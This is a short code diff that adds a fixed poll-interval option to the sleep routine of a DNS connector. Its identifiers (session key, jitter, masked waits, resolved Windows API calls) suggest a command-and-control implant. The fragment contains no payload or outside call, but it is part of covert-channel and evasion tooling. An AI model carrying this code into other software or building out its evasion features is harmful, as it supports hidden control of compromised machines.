@@ -990,7 +990,7 @@ void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
     }
 }
 
-void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
+void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs)
 {
     BOOL isBusy = this->IsBusy();
     BOOL burst = isBusy || (this->lastUpTotal >= 1024) || (this->lastDownTotal >= 1024) || hasOutput;
@@ -1012,7 +1012,17 @@ void ConnectorDNS::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDela
         this->ResetTrafficTotals();
     }
     else {
-        WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
+        if (pollIntervalMs > 0) {
+            if (wakeupEvent) {
+                DWORD r = ApiWin->WaitForSingleObject(wakeupEvent, pollIntervalMs);
+                if (r == WAIT_OBJECT_0)
+                    ApiWin->ResetEvent(wakeupEvent);
+            } else {
+                ApiWin->Sleep(pollIntervalMs);
+            }
+        } else {
+            WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
+        }
         if (burst)
             this->ResetTrafficTotals();
     }
